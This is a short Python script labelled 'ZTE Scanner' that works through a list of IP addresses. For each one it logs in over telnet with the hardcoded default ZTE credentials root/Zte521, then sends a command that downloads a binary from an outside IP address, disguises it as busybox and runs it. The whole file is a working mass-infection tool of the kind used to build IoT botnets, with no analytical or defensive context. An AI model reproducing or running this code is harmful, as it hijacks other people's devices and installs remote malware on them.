#!/usr/bin/python
# ZTE Scanner | By; LiGhT

import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

ips = open(sys.argv[1], "r").readlines()
username = "root"
password = "Zte521"
cmd = "cd /var/; rm -rf busybox filename; wget http://54.68.172.22/hoho -O filename ; cp /bin/busybox ./; busybox cat filename > busybox;./busybox ;rm -rf busybox filename" #KEEP FORMAT OF PAYLOAD
#cmd = "reboot"
count = 0
def readUntil(tn, string, timeout=15):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

class ztee(threading.Thread):
        def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
        def run(self):
		try:
			tn = socket.socket()
			tn.settimeout(5)
			tn.connect((self.ip,23))
		except Exception:
			print "[%s] Timeout"%(count)
		try:
			time.sleep(0.01)
			hoho = ''
			hoho += readUntil(tn, ":")
			if "ogin" in hoho:
				tn.send(username + "\n")
		except Exception:
			tn.close()
		try:
			hoho = ''
			hoho += readUntil(tn, ":")
			if "assword" in hoho:
				tn.send(password + "\n")
				time.sleep(3)
		except Exception:
			tn.close()
		try:
			mp = ''
			mp += tn.recv(1024)
			if "#" in mp or "$" in mp:
				tn.send(cmd + "\n")
				print "\033[32m[%s] command sent %s!\033[37m"%(count, self.ip)
				time.sleep(30)
				tn.close()				
		except Exception:
			tn.close()
			print "[%s] Timeout"%(count)
for ip in ips:
	try:
		count += 1
		t = ztee(ip)
		t.start()
		time.sleep(0.02)
	except:
		pass